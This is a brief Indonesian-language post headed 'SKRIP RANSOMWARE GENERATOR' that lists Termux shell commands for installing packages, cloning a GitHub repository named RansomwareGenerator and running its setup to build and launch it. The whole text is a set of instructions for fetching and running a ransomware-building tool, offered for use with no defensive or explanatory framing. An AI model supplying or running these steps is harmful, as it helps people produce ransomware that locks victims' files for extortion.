SKRIP RANSOMWARE GENERATOR
*COMMAND* :

apt update -y && apt upgrade -y
pkg install curl git mpv -y
pkg install boxes -y
pkg install python -y
gem install lolcat
git clone https://github.com/Termux-Tools-ExecNoxx/RansomwareGenerator
cd RansomwareGenerator
bash bash.setup build
bash bash.setup run
